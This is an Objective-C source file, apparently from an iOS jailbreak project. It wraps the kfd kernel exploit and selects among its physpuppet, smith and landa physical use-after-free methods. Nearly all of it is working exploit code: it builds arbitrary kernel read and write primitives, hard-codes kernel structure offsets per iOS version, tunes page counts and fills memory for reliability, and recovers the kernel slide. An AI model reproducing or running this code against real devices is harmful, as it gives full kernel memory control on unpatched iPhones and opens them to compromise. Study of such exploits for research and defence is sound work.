#import "Exploit/libkfd.h"
#undef T1SZ_BOOT
#import <xpc/xpc.h>
#import <libjailbreak/info.h>
#import <libjailbreak/primitives_external.h>
#import <os/proc.h>


uint64_t gKfd = 0;

uint8_t kread8(uint64_t where) {
    uint64_t out;
    kread(gKfd, where, &out, sizeof(uint64_t));
    return (uint8_t)out;
}
uint16_t kread16(uint64_t where) {
    uint64_t out;
    kread(gKfd, where, &out, sizeof(uint64_t));
    return (uint16_t)out;
}
uint32_t kread32(uint64_t where) {
    uint64_t out;
    kread(gKfd, where, &out, sizeof(uint64_t));
    return (uint32_t)out;
}
uint64_t kread64(uint64_t where) {
    uint64_t out;
    kread(gKfd, where, &out, sizeof(uint64_t));
    return out;
}

void kwrite8(uint64_t where, uint8_t what) {
    uint8_t _buf[8] = {};
    _buf[0] = what;
    _buf[1] = kread8(where+1);
    _buf[2] = kread8(where+2);
    _buf[3] = kread8(where+3);
    _buf[4] = kread8(where+4);
    _buf[5] = kread8(where+5);
    _buf[6] = kread8(where+6);
    _buf[7] = kread8(where+7);
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}

void kwrite16(uint64_t where, uint16_t what) {
    u16 _buf[4] = {};
    _buf[0] = what;
    _buf[1] = kread16(where+2);
    _buf[2] = kread16(where+4);
    _buf[3] = kread16(where+6);
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}

void kwrite32(uint64_t where, uint32_t what) {
    u32 _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kread32(where+4);
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}
void kwrite64(uint64_t where, uint64_t what) {
    u64 _buf[1] = {};
    _buf[0] = what;
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}

int kreadbuf(uint64_t where, void *buf, size_t size)
{
    if (size == 1) {
        *(uint8_t*)buf = kread8(where);
    }
    else if (size == 2) {
        *(uint16_t*)buf = kread16(where);
    }
    else if (size == 4) {
        *(uint32_t*)buf = kread32(where);
    }
    else {
        if (size >= UINT16_MAX) {
            for (uint64_t start = 0; start < size; start += UINT16_MAX) {
                uint64_t sizeToUse = UINT16_MAX;
                if (start + sizeToUse > size) {
                    sizeToUse = (size - start);
                }
                kread((u64)(gKfd), where+start, ((uint8_t *)buf)+start, sizeToUse);
            }
        } else {
            kread((u64)(gKfd), where, buf, size);
        }
    }
    return 0;
}

int kwritebuf(uint64_t where, const void *buf, size_t size)
{
    if (size == 1) {
        kwrite8(where, *(uint8_t*)buf);
    }
    else if (size == 2) {
        kwrite16(where, *(uint16_t*)buf);
    }
    else if (size == 4) {
        kwrite32(where, *(uint32_t*)buf);
    }
    else {
        if (size >= UINT16_MAX) {
            for (uint64_t start = 0; start < size; start += UINT16_MAX) {
                uint64_t sizeToUse = UINT16_MAX;
                if (start + sizeToUse > size) {
                    sizeToUse = (size - start);
                }
                kwrite((u64)(gKfd), (void*)((uint8_t *)buf)+start, where+start, sizeToUse);
            }
        } else {
            kwrite((u64)(gKfd), (void*)buf, where, size);
        }
    }
    return 0;
}

int exploit_init(const char *flavor)
{
    u64 method = 0;
    if (!strcmp(flavor, "physpuppet")) {
        method = puaf_physpuppet;
    }
    else if(!strcmp(flavor, "smith")) {
        method = puaf_smith;
    }
    else if (!strcmp(flavor, "landa")) {
        method = puaf_landa;
    }
    else {
        return -1;
    }

    bool isiOS15 = false;

    u64 kread_method = 0, kwrite_method = 0;
    if (@available(iOS 16.0, *)) {
        kread_method = kread_sem_open;
        kwrite_method = kwrite_sem_open;
    }
    else {
        kread_method = kread_IOSurface;
        kwrite_method = kwrite_IOSurface;
        isiOS15 = true;
    }

    uint64_t vm_map__pmap = koffsetof(vm_map, pmap);

    uint64_t pmap_to_hint = 0; // offset between vm_map->pmap and vm_map->hint
    if (@available(iOS 16.0, *)) {
        pmap_to_hint = 0x58;
    }
    else if(@available(iOS 15.4, *)) {
        pmap_to_hint = 0x38;
    }
    else {
        pmap_to_hint = 0xB8;
    }

    dynamic_system_info = (struct dynamic_info){
        .kread_kqueue_workloop_ctl_supported = true,
        .krkw_iosurface_supported = (kread_method == kread_IOSurface),
        .perf_supported = (kread_method != kread_IOSurface || kwrite_method != kwrite_IOSurface),
        
        .kernelcache__static_base = kconstant(staticBase),

        .proc__p_list__le_next = koffsetof(proc, list_next),
        .proc__p_list__le_prev = koffsetof(proc, list_prev),
        .proc__p_pid           = koffsetof(proc, pid),
        .proc__p_fd__fd_ofiles = koffsetof(proc, fd) + koffsetof(filedesc, ofiles_start),
        .proc__object_size     = ksizeof(proc),
    
        .task__map = koffsetof(task, map),
    
        .vm_map__hdr_links_prev             = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, last),
        .vm_map__hdr_links_next             = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, first),
        .vm_map__min_offset                 = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, min_offset),
        .vm_map__max_offset                 = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, max_offset),
        .vm_map__hdr_nentries               = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, max_offset) + 0x8,
        .vm_map__hdr_nentries_u64           = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, max_offset) + 0x8,
        .vm_map__hdr_rb_head_store_rbh_root = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, max_offset) + 0x18,
    
        .vm_map__pmap        = vm_map__pmap,
        .vm_map__hint        = vm_map__pmap + pmap_to_hint,
        .vm_map__hole_hint   = vm_map__pmap + pmap_to_hint + 0x8,
        .vm_map__holes_list  = vm_map__pmap + pmap_to_hint + 0x10,
        .vm_map__object_size = vm_map__pmap + pmap_to_hint + 0x28,
        
        .IOSurface__isa                 =   0x0,
        .IOSurface__pixelFormat         =  0xa4,
        .IOSurface__allocSize           =  0xac,
        .IOSurface__useCountPtr         =  0xc0,
        .IOSurface__indexedTimestampPtr = 0x360,
        .IOSurface__readDisplacement    =  0x14,

        .thread__thread_id = 0x400, // TODO: Universalize (Only relevant for kread_kqueue_workloop_ctl)

        .kernelcache__allproc          = ksymbol(allproc),
        
        .kernelcache__cdevsw           = ksymbol(cdevsw),
        .kernelcache__gPhysBase        = ksymbol(gPhysBase),
        .kernelcache__gPhysSize        = ksymbol(gPhysSize),
        .kernelcache__gVirtBase        = ksymbol(gVirtBase),
        .kernelcache__perfmon_dev_open = ksymbol(perfmon_dev_open),
        .kernelcache__perfmon_devices  = ksymbol(perfmon_devices),
        .kernelcache__ptov_table       = ksymbol(ptov_table),
        .kernelcache__vn_kqfilter      = ksymbol(vn_kqfilter),
        
        .device__T1SZ_BOOT            = kconstant(T1SZ_BOOT),
        .device__ARM_TT_L1_INDEX_MASK = kconstant(ARM_TT_L1_INDEX_MASK),
    };

    if (isiOS15) {
        dynamic_system_info.proc__task = 0x10;
    }
    if (@available(iOS 15.4, *)) {
        dynamic_system_info.vm_map__hdr_rb_head_store_rbh_root -= 0x8;
    }

    cpu_subtype_t cpuFamily = 0;
    size_t cpuFamilySize = sizeof(cpuFamily);
    sysctlbyname("hw.cpufamily", &cpuFamily, &cpuFamilySize, NULL, 0);

    // hw.memsize reports the amount of RAM after carveouts, so we pick a value lower than the
    // actual amount of RAM to compare against.
    uint64_t device_memory = 0;
    size_t device_memory_size = sizeof(device_memory);
    int res = sysctlbyname("hw.memsize", &device_memory, &device_memory_size, NULL, 0);

    size_t available_memory = os_proc_available_memory();

    int puaf_pages = 512;
    if (device_memory >= 1024 * 1024 * 1024 * 5ULL) { // 6GB devices
        // These devices are remarkably more reliable with 3072
        puaf_pages = 3072;
    } else if (cpuFamily == CPUFAMILY_ARM_TWISTER) { // A9
        puaf_pages = 128;
        if (@available(iOS 16.0, *)) {
            // sem_open does not like 128
            puaf_pages = 160;
        }
    } else if (cpuFamily == CPUFAMILY_ARM_TYPHOON) { // A8
        puaf_pages = 256;
    }

    printf("device info: CPU family: 0x%x, RAM: 0x%010llx, available: 0x%010zx\n", cpuFamily, device_memory, available_memory);

    size_t hogger_memory = 0;
    if (device_memory > 1024 * 1024 * 1024 * 12ULL) { // 16GB devices
        // We want to hog 4GB at max, but we want to leave some memory for the exploit as well
        // Reserve 512MB + (puaf_pages * page size)
        size_t minimum_memory_remaining = 1024 * 1024 * 512ULL;
        // Don't hog if the available memory is less than 1.5 times the minimum memory remaining
        if (available_memory <= (size_t)(minimum_memory_remaining * 1.5)) {
            hogger_memory = 0;
        } else {
            hogger_memory = available_memory - min(minimum_memory_remaining, 1024 * 1024 * 1024 * 4ULL);
        }
    }

    printf("PUAF pages: %d, hogger memory: 0x%010zx\n", puaf_pages, hogger_memory);

    void* hogged = NULL;
    if (hogger_memory > 0) {
        hogged = malloc(hogger_memory);
        if (hogged != NULL) {
            memset(hogged, 0x41, hogger_memory);
        } else {
            printf("Failed to hog memory\n");
        }
    }

    size_t available_memory_after_hogging = os_proc_available_memory();
    printf("Available memory after hogging: 0x%010zx\n", available_memory_after_hogging);

    gKfd = kopen(puaf_pages, method, kread_method, kwrite_method);
    gPrimitives.krwMinSafeReadSize = 0;
    gPrimitives.kreadbuf = kreadbuf;
    gPrimitives.kwritebuf = kwritebuf;

    if (hogged != NULL) {
        free(hogged);
    }
    
    gSystemInfo.kernelConstant.slide = ((struct kfd *)gKfd)->info.kaddr.kernel_slide;

    return 0;
}

int exploit_deinit(void)
{
    if (gPrimitives.kreadbuf == kreadbuf) {
        gPrimitives.kreadbuf = NULL;
    }
    if (gPrimitives.kwritebuf == kwritebuf) {
        gPrimitives.kwritebuf = NULL;
    }

    if (!gKfd) return -1;
    kclose(gKfd);

    return 0;
}
